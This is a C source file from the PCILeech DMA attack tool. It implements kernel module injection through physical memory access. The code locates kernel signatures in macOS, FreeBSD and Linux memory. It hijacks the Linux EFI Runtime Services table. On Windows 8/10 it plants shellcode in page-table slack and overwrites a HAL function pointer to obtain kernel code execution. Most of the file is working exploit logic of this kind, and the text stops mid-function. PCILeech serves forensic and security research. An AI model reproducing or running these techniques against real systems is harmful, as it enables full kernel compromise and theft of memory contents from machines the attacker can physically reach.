// kmd.c : implementation related to operating systems kernel modules functionality.
//
// (c) Ulf Frisk, 2016, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "kmd.h"
#include "device.h"
#include "util.h"
#include "executor.h"

typedef struct tdKMDHANDLE_S12 {
	DWORD dwPageAddr32;
	DWORD dwPageOffset;
	BYTE pbOrig[4096];
	BYTE pbPatch[4096];
	BYTE pbLatest[4096];
	QWORD qwPTE;
	QWORD qwPTEOrig;
	QWORD qwPTEAddrPhys;
} KMDHANDLE_S12, *PKMDHANDLE_S12;

typedef struct tdKERNELSEEKER {
	PBYTE pbSeek;
	DWORD cbSeek;
	DWORD aSeek;
	DWORD aTableEntry;
	QWORD vaSeek;
	QWORD vaFn;
} KERNELSEEKER, *PKERNELSEEKER;

#define STAGE1_OFFSET_CALL_ADD			1
#define STAGE2_OFFSET_STAGE3_PHYSADDR	4
#define STAGE2_OFFSET_FN_STAGE1_ORIG	8
#define STAGE2_OFFSET_EXTRADATA1		16

BOOL KMD_GetPhysicalMemoryMap(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _Inout_ PKMDHANDLE phKMD);
BOOL KMD_SetupStage3(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _In_ DWORD dwPhysicalAddress, _In_ PBYTE pbStage3, _In_ DWORD cbStage3);

//-------------------------------------------------------------------------------
// Signature mathing below.
//-------------------------------------------------------------------------------

HRESULT KMD_FindSignature2(_Inout_ PBYTE pbPages, _In_ DWORD cPages, _In_ DWORD dwAddrBase, _Inout_ PSIGNATURE pSignatures, _In_ DWORD cSignatures, _Out_ PDWORD pdwSignatureMatch)
{
	PBYTE pb;
	DWORD pgIdx, i, j;
	PSIGNATURE ps;
	QWORD qwAddressCurrent;
	for(pgIdx = 0; pgIdx < cPages; pgIdx++) {
		pb = pbPages + (4096 * pgIdx);
		qwAddressCurrent = dwAddrBase + (4096 * pgIdx);
		for(i = 0; i < cSignatures; i++) {
			ps = pSignatures + i;
			for(j = 0; j < 2; j++) {
				if(ps->chunk[j].qwAddress) { // already processed and found - continue
					continue;
				}
				if((ps->chunk[j].cbOffset > 0xfff) && ((ps->chunk[j].cbOffset & ~0xfff) != qwAddressCurrent)) {
					continue;
				}
				if(!ps->chunk[j].cb || !memcmp(pb + (ps->chunk[j].cbOffset & 0xfff), ps->chunk[j].pb, ps->chunk[j].cb)) {
					ps->chunk[j].cb = 4096;
					memcpy(ps->chunk[j].pb, pb, 4096);
					ps->chunk[j].qwAddress = qwAddressCurrent;
				}
			}
			if(ps->chunk[0].qwAddress && ps->chunk[1].qwAddress) {
				*pdwSignatureMatch = i;
				return S_OK;
			}
		}
	}
	return E_FAIL;
}

HRESULT KMD_FindSignature1(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _Inout_ PSIGNATURE pSignatures, _In_ DWORD cSignatures, _Out_ PDWORD pdwSignatureMatchIdx)
{
	QWORD i, qwAddrMax, qwAddrCurrent = 0x100000;
	PBYTE pbBuffer8M;
	HRESULT hr;
	PAGE_STATISTICS pageStat;
	// special case (fixed memory location && zero signature byte length)
	for(i = 0; i < cSignatures; i++) {
		if((pSignatures[i].chunk[0].cbOffset > 0xfff) && (pSignatures[i].chunk[0].cb == 0) && (pSignatures[i].chunk[1].cbOffset > 0xfff) && (pSignatures[i].chunk[1].cb == 0)) {
			pSignatures[i].chunk[0].qwAddress = pSignatures[i].chunk[0].cbOffset & ~0xFFF;
			pSignatures[i].chunk[1].qwAddress = pSignatures[i].chunk[1].cbOffset & ~0xFFF;
			return TRUE;
		}
	}
	// initialize / allocate memory / load signatures
	if(!(pbBuffer8M = LocalAlloc(0, 0x800000))) {
		return E_OUTOFMEMORY;
	}
	// loop kmd-find
	qwAddrMax = min(pCfg->qwAddrMax, 0xffffffff);
	PageStatInitialize(&pageStat, qwAddrCurrent, qwAddrMax, "Searching for KMD location", FALSE, FALSE);
	while(qwAddrCurrent < qwAddrMax) {
		pageStat.qwAddr = qwAddrCurrent;
		if(DeviceReadDMA(pDeviceData, (DWORD)qwAddrCurrent, pbBuffer8M, 0x800000, 0)) {
			pageStat.cPageSuccess += 2048;
			hr = KMD_FindSignature2(pbBuffer8M, 2048, (DWORD)qwAddrCurrent, pSignatures, cSignatures, pdwSignatureMatchIdx);
			if(SUCCEEDED(hr)) {
				LocalFree(pbBuffer8M);
				pageStat.szAction = "Waiting for KMD to activate";
				PageStatClose(&pageStat);
				return S_OK;
			}
		} else {
			pageStat.cPageFail += 2048;
		}
		qwAddrCurrent += 0x800000;
	}
	LocalFree(pbBuffer8M);
	PageStatClose(&pageStat);
	return E_FAIL;
}

// EFI RUNTIME SERVICES TABLE SIGNATURE (see UEFI specification (2.6) for detailed information).
#define IS_SIGNATURE_EFI_RUNTIME_SERVICES(pb) ((*(PQWORD)(pb) == 0x56524553544e5552) && (*(PDWORD)(pb + 12) == 0x88) && (*(PDWORD)(pb + 20) == 0))

BOOL KMD_FindSignature_EfiRuntimeServices(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _Out_ PQWORD pqwAddrPhys)
{
	BOOL result = FALSE;
	QWORD o, qwCurrentAddress;
	PAGE_STATISTICS pageStat;
	PBYTE pbBuffer16M;
	if(!(pbBuffer16M = LocalAlloc(0, 0x01000000))) {
		return FALSE;
	}
	pCfg->qwAddrMin &= ~0xfff;
	pCfg->qwAddrMax = (pCfg->qwAddrMax + 1) & ~0xfff;
	if(pCfg->qwAddrMax == 0) {
		pCfg->qwAddrMax = 0x100000000;
	}
	qwCurrentAddress = pCfg->qwAddrMin;
	PageStatInitialize(&pageStat, pCfg->qwAddrMin, pCfg->qwAddrMax, "Searching for EFI Runtime Services", pDeviceData->KMDHandle ? TRUE : FALSE, pCfg->fVerbose);
	while(qwCurrentAddress < pCfg->qwAddrMax) {
		result = Util_Read16M(pCfg, pDeviceData, pbBuffer16M, qwCurrentAddress, &pageStat);
		if(!result && !pCfg->fForceRW && !pDeviceData->KMDHandle) {
			goto cleanup;
		}
		for(o = 0x18; o < 0x01000000 - 0x88; o += 8) {
			// EFI RUNTIME SERVICES TABLE SIGNATURE (see UEFI specification (2.6) for detailed information).
			// 0x30646870 == phd0 EFI memory artifact required to rule out additional false positives.
			if((*(PDWORD)(pbBuffer16M + o - 0x18) == 0x30646870) && IS_SIGNATURE_EFI_RUNTIME_SERVICES(pbBuffer16M + o)) {
				pageStat.szAction = "Waiting for EFI Runtime Services";
				*pqwAddrPhys = qwCurrentAddress + o;
				result = TRUE;
				goto cleanup;
			}
		}
		// add to address
		qwCurrentAddress += 0x01000000;
	}
cleanup:
	LocalFree(pbBuffer16M);
	PageStatClose(&pageStat);
	return result;
}

//-------------------------------------------------------------------------------
// macOS generic kernel seek below.
//-------------------------------------------------------------------------------

BOOL KMD_MacOSIsKernelAddress(_In_ PBYTE pbPage)
{
	DWORD i;
	if(*(PDWORD)pbPage != 0xfeedfacf) { return FALSE; } // mach_header_64 magic
	if(*(PDWORD)(pbPage + 4) != 0x01000007) { return FALSE; } // mach_header_64 cputype
	// search for kernel header data (eliminate other macho-headers)
	for(i = 0x20; i < 0xfc0; i += 8) {
		if(*(PQWORD)(pbPage + i) == 0x5450746f6F625F5F) { // __bootPT
			return TRUE;
		}
	}
	return FALSE;
}

BOOL KMD_MacOSKernelGetBase(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _Out_ PDWORD pdwKernelBase, _Out_ PDWORD pdwTextHIB, _Out_ PDWORD pcbTextHIB)
{
	BYTE pbPage[4096];
	DWORD i, cKSlide;
	for(cKSlide = 1; cKSlide <= 512; cKSlide++) {
		*pdwKernelBase = cKSlide * 0x00200000; // KASLR = ([RND:1..512] * 0x00200000)
		if(!DeviceReadDMA(pDeviceData, *pdwKernelBase, pbPage, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
			printf("KMD: Failed. Error reading address: 0x%08x\n", *pdwKernelBase);
			return FALSE;
		}
		if(KMD_MacOSIsKernelAddress(pbPage)) {
			for(i = 0x20; i < 0xfc0; i += 8) {
				if(*(PQWORD)(pbPage + i) == 0x0000747865745F5F && *(PQWORD)(pbPage + i + 0x10) == 0x0000004249485F5F) { // __text && __HIB
					*pdwTextHIB = (DWORD)*(PQWORD)(pbPage + i + 0x20);
					*pcbTextHIB = (DWORD)*(PQWORD)(pbPage + i + 0x28);
					return TRUE;
				}
			}
		}
	}
	return FALSE;
}

BOOL KMD_MacOSKernelSeekSignature(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _Out_ PSIGNATURE pSignature)
{
	const BYTE SIGNATURE_BCOPY[] = { 0x48, 0x87, 0xF7, 0x48, 0x89, 0xD1, 0x48, 0x89, 0xF8, 0x48, 0x29, 0xF0, 0x48, 0x39, 0xC8, 0x72 };
	DWORD i, dwKernelBase, dwTextHIB, cbTextHIB;
	PBYTE pbTextHIB;
	if(!KMD_MacOSKernelGetBase(pCfg, pDeviceData, &dwKernelBase, &dwTextHIB, &cbTextHIB)) {
		return FALSE;
	}
	cbTextHIB = (cbTextHIB + 0xfff) & 0xfffff000;
	pbTextHIB = LocalAlloc(0, cbTextHIB);
	if(!pbTextHIB) { return FALSE; }
	if(!DeviceReadDMA(pDeviceData, dwTextHIB, pbTextHIB, cbTextHIB, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
		LocalFree(pbTextHIB);
		return FALSE;
	}
	for(i = 0; i < cbTextHIB - 0x300; i++) {
		if(0 == memcmp(pbTextHIB + i, SIGNATURE_BCOPY, 16)) {
			Util_CreateSignatureMacOSGeneric(dwKernelBase, dwTextHIB + i, dwTextHIB + cbTextHIB - 0x300, pSignature);
			LocalFree(pbTextHIB);
			return TRUE;
		}
	}
	LocalFree(pbTextHIB);
	return FALSE;
}

//-------------------------------------------------------------------------------
// FreeBSD generic kernel seek below.
//-------------------------------------------------------------------------------

BOOL KMD_FreeBSDKernelSeekSignature(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _Out_ PSIGNATURE pSignature)
{
	DWORD i, dwo_memcpy_str, dwo_strtab, dwa_memcpy;
	PBYTE pb64M = LocalAlloc(LMEM_ZEROINIT, 0x04000000);
	if(!pb64M) { return FALSE; }
	for(i = 0x01000000; i < 0x04000000; i += 0x01000000) {
		DeviceReadDMA(pDeviceData, i, pb64M + i, 0x01000000, PCILEECH_MEM_FLAG_RETRYONFAIL);
	}
	// 1: search for string 'vn_open'
	i = 0;
	while(TRUE) {
		i++;
		if(i > 0x04000000 - 0x1000) { goto error; }
		if(0 == memcmp(pb64M + i, "\0vn_open", 9)) { break; }
	}
	dwo_memcpy_str = i + 1;
	i = i & ~3;
	// 2: scan backwards for base of strtab
	while(TRUE) {
		i -= 4;
		if(i < 0x1000) { goto error; }
		if(0 == *(PDWORD)(pb64M + i - 4)) { 
			DWORD dwbug = *(PDWORD)(pb64M + i - 4);
			break; 
		}
	}
	dwo_strtab = i;
	i = i - 8; // skip necessary
	// 3: scan backwards for 'vn_open' function address
	while(TRUE) {
		i -= 0x18;
		if(i < 0x1000) { goto error; }
		if(0 == *(PQWORD)(pb64M + i)) { goto error; }
		if(dwo_memcpy_str - dwo_strtab == *(PDWORD)(pb64M + i)) { break; }
	}
	dwa_memcpy = *(PDWORD)(pb64M + i + 8) & 0x7fffffff;
	// 4: create signature
	LocalFree(pb64M);
	Util_CreateSignatureFreeBSDGeneric(dwo_strtab, dwa_memcpy, pSignature);
	return TRUE;
error:
	LocalFree(pb64M);
	return FALSE;
}

//-------------------------------------------------------------------------------
// LINUX generic kernel seek below. (pre 4.8 kernel versions).
//-------------------------------------------------------------------------------

BOOL KMD_LinuxIsAllAddrFoundSeek(_In_ PKERNELSEEKER pS, _In_ DWORD cS)
{
	for(DWORD j = 0; j < cS; j++) {
		if(!pS[j].aSeek) {
			return FALSE;
		}
	}
	return TRUE;
}

BOOL KMD_LinuxIsAllAddrFoundTableEntry(_In_ PKERNELSEEKER pS, _In_ DWORD cS)
{
	for(DWORD j = 0; j < cS; j++) {
		if(!pS[j].aTableEntry) {
			return FALSE;
		}
	}
	return TRUE;
}

BOOL KMD_LinuxFindFunctionAddr(_In_ PBYTE pb, _In_ DWORD cb, _In_ PKERNELSEEKER pS, _In_ DWORD cS)
{
	DWORD o, i;
	for(o = 0; o < cb - 0x1000; o++) {
		for(i = 0; i < cS; i++) {
			if(!pS[i].aSeek && !memcmp(pb + o, pS[i].pbSeek, pS[i].cbSeek)) {
				pS[i].aSeek = o + 1;
				if(KMD_LinuxIsAllAddrFoundSeek(pS, cS)) {
					return TRUE;
				}
			}
		}
	}
	return FALSE;
}

BOOL KMD_LinuxFindFunctionAddrTBL(_In_ PBYTE pb, _In_ DWORD cb, _In_ PKERNELSEEKER pS, _In_ DWORD cS)
{
	DWORD o, i;
	for(o = 0x1000; o < cb - 0x1000; o = o + 8) {
		if(((*(PQWORD)(pb + o) & 0xffffffff00000000) == 0xffffffff00000000) && ((*(PQWORD)(pb + o - 8) & 0xffffffff00000000) == 0xffffffff00000000)) { // kernel addr ptr
			for(i = 0; i < cS; i++) {
				if(!pS[i].aTableEntry &&
					((*(PQWORD)(pb + o) & 0x1fffff) == (0x1fffff & pS[i].aSeek)) && // KASLR align on 2MB boundries (0x1fffff)
					((*(PQWORD)(pb + o) & ~0x1fffff) != (*(PQWORD)(pb + o - 8)  & ~0x1fffff))) // several tables may exists - skip symbol name table
				{
					pS[i].aTableEntry = o;
					pS[i].vaSeek = *(PQWORD)(pb + o);
					pS[i].vaFn = *(PQWORD)(pb + o - 8);
					if(KMD_LinuxIsAllAddrFoundTableEntry(pS, cS)) {
						return TRUE;
					}
				}
			}
		}
	}
	return FALSE;
}

#define CONFIG_LINUX_SEEK_BUFFER_SIZE	0x01000000
#define CONFIG_LINUX_SEEK_CKSLIDES		512
BOOL KMD_LinuxKernelSeekSignature(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _Out_ PSIGNATURE pSignature)
{
	BOOL result;
	KERNELSEEKER ks[2] = {
		{ .pbSeek = "\0kallsyms_lookup_name",.cbSeek = 22 },
		{ .pbSeek = "\0vfs_read",.cbSeek = 10 }
	};
	DWORD cKSlide, dwKernelBase;
	PBYTE pb = LocalAlloc(0, CONFIG_LINUX_SEEK_BUFFER_SIZE);
	if(!pb) { return FALSE; }
	for(cKSlide = 0; cKSlide < CONFIG_LINUX_SEEK_CKSLIDES; cKSlide++) {
		// calculate the kernel base (@16M if no KASLR, @2M offsets if KASLR).
		// read 16M of memory first, if KASLR read 2M chunks at top of analysis buffer (performance reasons).
		dwKernelBase = 0x01000000 + cKSlide * 0x00200000; // KASLR = 16M + ([RND:0..511] * 2M) ???
		if(cKSlide == 0) {
			DeviceReadDMA(pDeviceData, dwKernelBase, pb, 0x01000000, PCILEECH_MEM_FLAG_RETRYONFAIL);
		} else {
			memmove(pb, pb + 0x00200000, CONFIG_LINUX_SEEK_BUFFER_SIZE - 0x00200000);
			result = DeviceReadDMA(
				pDeviceData,
				dwKernelBase + CONFIG_LINUX_SEEK_BUFFER_SIZE - 0x00200000,
				pb + CONFIG_LINUX_SEEK_BUFFER_SIZE - 0x00200000,
				0x00200000,
				PCILEECH_MEM_FLAG_RETRYONFAIL);
		}
		result = 
			KMD_LinuxFindFunctionAddr(pb, CONFIG_LINUX_SEEK_BUFFER_SIZE, ks, 2) &&
			KMD_LinuxFindFunctionAddrTBL(pb, CONFIG_LINUX_SEEK_BUFFER_SIZE, ks, 2);
		if(result) {
			Util_CreateSignatureLinuxGenericPre48(dwKernelBase, ks[0].aSeek, ks[0].vaSeek, ks[0].vaFn, ks[1].vaFn, pSignature);
			break;
		}
	}
	LocalFree(pb);
	return result;
}

//-------------------------------------------------------------------------------
// LINUX EFI Runtime Services hijack.
//-------------------------------------------------------------------------------

BOOL KMDOpen_LinuxEfiRuntimeServicesHijack(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
{
	BOOL result;
	QWORD i, o, qwAddrEfiRt;
	DWORD dwPhysAddrS2, dwPhysAddrS3, *pdwPhysicalAddress;
	BYTE pb[0x1000], pbOrig[0x1000], pbEfiRt[0x1000];
	SIGNATURE oSignature;
	//------------------------------------------------
	// 1: Locate and fetch EFI Runtime Services table.
	//------------------------------------------------
	result = KMD_FindSignature_EfiRuntimeServices(pCfg, pDeviceData, &qwAddrEfiRt);
	if(!result) {
		printf("KMD: Failed. EFI Runtime Services not found.\n");
	}
	if((qwAddrEfiRt & 0xfff) + 0x88 > 0x1000) {
		printf("KMD: Failed. EFI Runtime Services table located on page boundary.\n");
		return FALSE;
	}
	result = DeviceReadDMA(pDeviceData, qwAddrEfiRt & ~0xfff, pbEfiRt, 0x1000, PCILEECH_MEM_FLAG_RETRYONFAIL);
	if(!result || !IS_SIGNATURE_EFI_RUNTIME_SERVICES(pbEfiRt + (qwAddrEfiRt & 0xfff))) {
		printf("KMD: Failed. Error reading EFI Runtime Services table.\n");
		return FALSE;
	}
	//------------------------------------------------
	// 2: Fetch signature and original data.
	//------------------------------------------------
	Util_CreateSignatureLinuxEfiRuntimeServices(&oSignature);
	*(PQWORD)(oSignature.chunk[3].pb + 0x28) = qwAddrEfiRt; // 0x28 == offset data_addr_runtserv.
	memcpy(oSignature.chunk[3].pb + 0x30, pbEfiRt + (qwAddrEfiRt & 0xfff) + 0x18, 0x70);	// 0x30 == offset data_runtserv_table_fn.
	result = DeviceReadDMA(pDeviceData, 0, pbOrig, 0x1000, PCILEECH_MEM_FLAG_RETRYONFAIL);
	if(!result) {
		printf("KMD: Failed. Error reading at address 0x0.\n");
		return FALSE;
	}
	//------------------------------------------------
	// 3: Patch wait to reveive execution of EFI code.
	//------------------------------------------------
	DeviceWriteDMA(pDeviceData, 0, oSignature.chunk[3].pb, 0x1000, PCILEECH_MEM_FLAG_RETRYONFAIL);
	for(i = 0; i < 14; i++) {
		o = (qwAddrEfiRt & 0xfff) + 0x18 + 8 * i;	// 14 tbl entries of 64-bit/8-byte size.
		*(PQWORD)(pbEfiRt + o) = 0x100 + 2 * i;	// each PUSH in receiving slide is 2 bytes, offset to code = 0x100.
	}
	DeviceWriteDMA(pDeviceData, qwAddrEfiRt, pbEfiRt + (qwAddrEfiRt & 0xfff), 0x88 /* 0x18 hdr, 0x70 fntbl */, PCILEECH_MEM_FLAG_RETRYONFAIL);
	memset(pb, 0, 0x1000);
	pdwPhysicalAddress = (PDWORD)(pb + 0x20);	// 0x20 == offset data_phys_addr_alloc.
	printf(
		"KMD: EFI Runtime Services table hijacked - Waiting to receive execution.\n"
		"     To trigger EFI execution take action. Example: 'switch user' in the\n"
		"     Ubuntu graphical lock screen may trigger EFI Runtime Services call.\n");
	do {
		Sleep(100);
		if(!DeviceReadDMA(pDeviceData, 0, pb, 0x1000, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
			Util_WaitForPowerCycle(pCfg, pDeviceData);
			printf("KMD: Resume waiting to receive execution.\n");
		}
	} while(!*pdwPhysicalAddress);
	dwPhysAddrS2 = *pdwPhysicalAddress;
	printf("KMD: Execution received - waiting for kernel hook to activate ...\n");
	//------------------------------------------------
	// 4: Restore EFI Runtime Services shellcode and move on to 2nd buffer.
	//------------------------------------------------
	DeviceWriteDMA(pDeviceData, 0, pbOrig, 0x1000, 0);
	memset(pb, 0, 0x1000);
	printf("KMD: Waiting to receive execution.\n");
	do {
		Sleep(100);
		if(!DeviceReadDMA(pDeviceData, dwPhysAddrS2, pb, 0x1000, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
			printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
			return FALSE;
		}
	} while(!*pdwPhysicalAddress);
	dwPhysAddrS3 = *pdwPhysicalAddress;
	//------------------------------------------------
	// 5: Clear 2nd buffer and set up stage #3.
	//------------------------------------------------
	memset(pb, 0, 0x1000);
	DeviceWriteDMA(pDeviceData, dwPhysAddrS2, pb, 0x1000, 0);
	return KMD_SetupStage3(pCfg, pDeviceData, dwPhysAddrS3, oSignature.chunk[4].pb, 4096);
}

//-------------------------------------------------------------------------------
// Windows 8/10 generic kernel implant below.
//-------------------------------------------------------------------------------

BOOL KMD_Win_SearchTableHalpInterruptController(_In_ PBYTE pbPage, _In_ QWORD qwPageVA, _Out_ PDWORD dwHookFnPgOffset)
{
	DWORD i;
	BOOL result;
	for(i = 0; i < (0x1000 - 0x78); i += 8) {
		result =
			(*(PQWORD)(pbPage + i + 0x18) == 0x28) &&
			((*(PQWORD)(pbPage + i + 0x00) & ~0xfff) == qwPageVA) &&
			((*(PQWORD)(pbPage + i + 0x10) & ~0xfff) == qwPageVA) &&
			((*(PQWORD)(pbPage + i + 0x78) & 0xffffff0000000000) == 0xfffff80000000000);
		if(result) {
			*dwHookFnPgOffset = i + 0x78;
			return TRUE;
		}
	}
	return FALSE;
}

// https://blog.coresecurity.com/2016/08/25/getting-physical-extreme-abuse-of-intel-based-paging-systems-part-3-windows-hals-heap/
// HAL is statically located at: ffffffffffd00000 (win8.1/win10 pre 1703)
// HAL is randomized between: fffff78000000000:fffff7ffc0000000 (win10 1703) [512 possible positions in PDPT]
BOOL KMDOpen_HalHijack(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
{
	DWORD ADDR_HAL_HEAP_PA = 0x00001000;
	//QWORD ADDR_SHELLCODE_VA = 0xffffffffffc00100;
	BOOL result;
	SIGNATURE oSignature;
	PDWORD pdwPhysicalAddress;
	BYTE pbHal[0x1000] = { 0 }, pbPT[0x1000] = { 0 }, pbNULL[0x300] = { 0 };
	DWORD dwHookFnPgOffset;
	QWORD qwPML4, qwHalVA, qwAddrHalHeapVA, qwPTEOrig, qwPTEPA, qwPTPA, qwShellcodeVA;
	//------------------------------------------------
	// 1: Fetch hal.dll heap and perform sanity checks.
	//------------------------------------------------
	Util_CreateSignatureWindowsHalGeneric(&oSignature);
	result = DeviceReadDMA(pDeviceData, ADDR_HAL_HEAP_PA, pbHal, 0x1000, PCILEECH_MEM_FLAG_RETRYONFAIL);
	qwPML4 = *(PQWORD)(pbHal + 0xa0);
	qwHalVA = *(PQWORD)(pbHal + 0x78);
	if(!result || (qwPML4 & 0xffffffff00000fff)) {
		printf("KMD: Failed. Error reading or interpreting memory #1.\n");
		return FALSE;
	}
	if(((qwHalVA & 0xfffffffffff00fff) != 0xffffffffffd00000) && ((qwHalVA & 0xffffff803fe00fff) != 0xfffff78000000000)) {
		printf("KMD: Failed. Error reading or interpreting memory #2.\n");
		return FALSE;
	}
	result = Util_PageTable_ReadPTE(pCfg, pDeviceData, qwPML4, qwHalVA, &qwPTEOrig, &qwPTEPA);
	if(!result || ((qwPTEOrig & 0x00007ffffffff003) != 0x1003)) {
		printf("KMD: Failed. Error reading or interpreting PTEs.\n");
		return FALSE;
	}
	//------------------------------------------------
	// 2: Search for function table in hal.dll heap.
	//------------------------------------------------
	for(qwAddrHalHeapVA = (qwHalVA & 0xffffffffffd00000); qwAddrHalHeapVA < (qwHalVA & 0xffffffffffd00000) + 0x100000; qwAddrHalHeapVA += 0x1000) {
		result =
			Util_PageTable_ReadPTE(pCfg, pDeviceData, qwPML4, qwAddrHalHeapVA, &qwPTEOrig, &qwPTEPA) &&
			((qwPTEOrig & 0x00007fff00000003) == 0x00000003) &&
			DeviceReadDMA(pDeviceData, (qwPTEOrig & 0xfffff000), pbHal, 0x1000, PCILEECH_MEM_FLAG_RETRYONFAIL) &&
			KMD_Win_SearchTableHalpInterruptController(pbHal, qwAddrHalHeapVA, &dwHookFnPgOffset);
		if(result) {
			break;
		}
	}
	if(!result) {
		printf("KMD: Failed. Failed finding entry point.\n");
		return FALSE;
	}
	qwPTPA = qwPTEPA & ~0xfff;
	result = DeviceReadDMA(pDeviceData, (DWORD)qwPTPA, pbPT, 0x1000, PCILEECH_MEM_FLAG_RETRYONFAIL);
	if(!result || memcmp(pbPT + 0x200, pbNULL, 0x300)) { // 0x300 bytes between 0x200:0x500 in Hal PT must be zero
		printf("KMD: Failed. Error reading or interpreting PT.\n");
		return FALSE;
	}
	qwShellcodeVA = (qwAddrHalHeapVA & 0xffffffffffe00000) + 0x40000 + 0x210;
	//------------------------------------------------
	// 3: Write shellcode into page table empty space.
	//------------------------------------------------
	*(PQWORD)(pbPT + 0x200) = qwPTPA | 0x63; // PTE for addr
	memcpy(pbPT + 0x210, oSignature.chunk[3].pb, oSignature.chunk[3].cb);
	*(PQWORD)(pbPT + 0x210 + STAGE2_OFFSET_FN_STAGE1_ORIG) = *(PQWORD)(pbHal + dwHookFnPgOffset);
	*(PQWORD)(pbPT + 0x210 + STAGE2_OFFSET_EXTRADATA1) = qwAddrHalHeapVA + dwHookFnPgOffset;
	DeviceWriteDMA(pDeviceData, qwPTPA + 0x200, pbPT + 0x200, 0x300, PCILEECH_MEM_FLAG_RETRYONFAIL);
	Util_PageTable_SetMode(pCfg, pDeviceData, qwPML4, qwShellcodeVA, TRUE);
	//------------------------------------------------
	// 4: Place hook by overwriting function addr in hal.dll heap.
	//------------------------------------------------
	Sleep(250);
	DeviceWriteDMA(pDeviceData, (qwPTEOrig & 0xfffff000) + dwHookFnPgOffset, (PBYTE)&qwShellcodeVA, sizeof(QWORD), PCILEECH_MEM_FLAG_RETRYONFAIL);
	if(pCfg->fVerbose) {
		printf("INFO: PA PT BASE:   0x%08x\n", qwPML4);
		printf("INFO: PA PT:        0x%08x\n", qwPTPA);
		printf("INFO: PA HAL HEAP:  0x%08x\n", (qwPTEOrig & 0xfffff000) + dwHookFnPgOffset);
		printf("INFO: VA SHELLCODE: 0x%016llx\n", qwShellcodeVA);
	}
	printf("KMD: Code inserted into the kernel - Waiting to receive execution.\n");
	//------------------------------------------------
	// 5: wait for patch to reveive execution.
	//------------------------------------------------
	pdwPhysicalAddress = (PDWORD)(pbPT + 0x210 + STAGE2_OFFSET_STAGE3_PHYSADDR);
	do {
		Sleep(100);
		if(!DeviceReadDMA(pDeviceData, (DWORD)qwPTPA, pbPT, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
			printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
			return FALSE;
		}
	} while(!*pdwPhysicalAddress);
	printf("KMD: Execution received - continuing ...\n");
	//------------------------------------------------
	// 6: Restore hooks to original.
	//------------------------------------------------
	Sleep(250);
	DeviceWriteDMA(pDeviceData, qwPTPA + 0x200, pbNULL, 0x300, 0);
	//------------------------------------------------
	// 7: Set up kernel module shellcode (stage3) and finish.
	//------------------------------------------------
	return KMD_SetupStage3(pCfg, pDeviceData, *pdwPhysicalAddress, oSignature.chunk[4].pb, 4096);
}

//-------------------------------------------------------------------------------
// KMD command function below.
//-------------------------------------------------------------------------------

BOOL KMD_IsRangeInPhysicalMap(_In_ PKMDHANDLE phKMD, _In_ QWORD qwBaseAddress, _In_ QWORD qwNumberOfBytes)
{
	PHYSICAL_MEMORY_RANGE pmr;
	for(QWORD i = 0; i < phKMD->cPhysicalMap; i++) {
		pmr = phKMD->pPhysicalMap[i];
		if(((pmr.BaseAddress <= qwBaseAddress) && (pmr.BaseAddress + pmr.NumberOfBytes >= qwBaseAddress + qwNumberOfBytes))) {
			return TRUE;
		}
	}
	return FALSE;
}

BOOL KMD_SubmitCommand(_In_opt_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _Inout_ PKMDHANDLE phKMD, _In_ QWORD op)
{
	HANDLE hCallback = NULL;
	phKMD->status->_op = op;
	if(!DeviceWriteDMA(pDeviceData, phKMD->dwPageAddr32, phKMD->pbPageData, 4096, 0)) {
		return FALSE;
	}
	do {
		if(!DeviceReadDMA(pDeviceData, phKMD->dwPageAddr32, phKMD->pbPageData, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
			Exec_CallbackClose(hCallback);
			return FALSE;
		}
		if(phKMD->status->_op == KMD_CMD_EXEC_EXTENDED) {
			Exec_Callback(pCfg, pDeviceData, phKMD->status, &hCallback);
		}
	} while(((phKMD->status->_op != KMD_CMD_COMPLETED) || (phKMD->status->_status != 1)) && phKMD->status->_status < 0x0fffffff);
	if(hCallback) { Exec_CallbackClose(hCallback); }
	return TRUE;
}

VOID KMD_PhysicalMemoryMapDisplay(_In_ PKMDHANDLE phKMD)
{
	QWORD i;
	PHYSICAL_MEMORY_RANGE pmr;
	printf("Kernel reported memory map below:\n START              END               #PAGES\n");
	for(i = 0; i < phKMD->cPhysicalMap; i++) {
		pmr = phKMD->pPhysicalMap[i];
		printf(
			" %016llx - %016llx  %08x\n",
			pmr.BaseAddress,
			pmr.BaseAddress + pmr.NumberOfBytes - 1,
			pmr.NumberOfBytes / 0x1000);
	}
	printf("----------------------------------------------\n");
}

BOOL KMD_GetPhysicalMemoryMap(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _Inout_ PKMDHANDLE phKMD)
{
	QWORD qwMaxMemoryAddress;
	KMD_SubmitCommand(pCfg, pDeviceData, phKMD, KMD_CMD_MEM_INFO);
	if(!phKMD->status->_result || !phKMD->status->_size)	{
		return FALSE;
	}
	phKMD->pPhysicalMap = LocalAlloc(LMEM_ZEROINIT, (phKMD->status->_size + 0x1000) & 0xfffff000);
	if(!phKMD->pPhysicalMap) { return FALSE; }
	DeviceReadDMA(pDeviceData, phKMD->status->DMAAddrPhysical, (PBYTE)phKMD->pPhysicalMap, (DWORD)((phKMD->status->_size + 0x1000) & 0xfffff000), 0);
	phKMD->cPhysicalMap = phKMD->status->_size / sizeof(PHYSICAL_MEMORY_RANGE);
	// adjust max memory according to physical memory
	qwMaxMemoryAddress = phKMD->pPhysicalMap[phKMD->cPhysicalMap - 1].BaseAddress;
